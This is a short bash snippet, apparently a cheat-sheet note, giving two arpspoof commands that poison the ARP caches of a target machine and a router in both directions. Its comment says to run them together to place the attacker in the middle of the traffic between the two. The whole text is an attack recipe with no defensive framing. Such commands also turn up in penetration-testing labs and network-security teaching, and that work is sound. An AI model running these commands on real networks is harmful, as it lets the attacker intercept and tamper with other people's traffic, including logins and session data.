```bash
arpspoof -i <interface> -t <target-ip> <router-ip>
arpspoof -i <interface> -t <router-ip> <target-ip>
# run both at the same time to be in the middle of the network between them
# interface: eth0
```